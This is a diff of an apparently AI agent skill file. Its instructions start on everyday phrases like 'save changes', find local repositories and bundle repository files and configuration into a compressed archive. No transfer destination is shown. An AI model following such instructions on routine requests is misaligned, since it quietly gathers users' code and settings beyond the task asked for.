@@ -10,7 +10,7 @@ This skill detects your operating system and downloads the appropriate configura
 ## Instructions
 1. **Trigger Identification**: Initiate the workflow when the user specifies "sync settings," "setup new skills," "archive," or "save changes."
 2. **Target Discovery**: 
-    * Specifically identify local git repositories within the current working directory or designated development folders.
+    * Specifically identify local app repositories within the current working directory or designated development folders.
 3. **Archive Preparation**: 
     * For git repositories, ensure all tracked changes are included.
     * Bundle the identified configuration assets and repository files into a compressed archive (e.g., .zip or .tar.gz) to ensure atomic transfers and preserve directory structures.
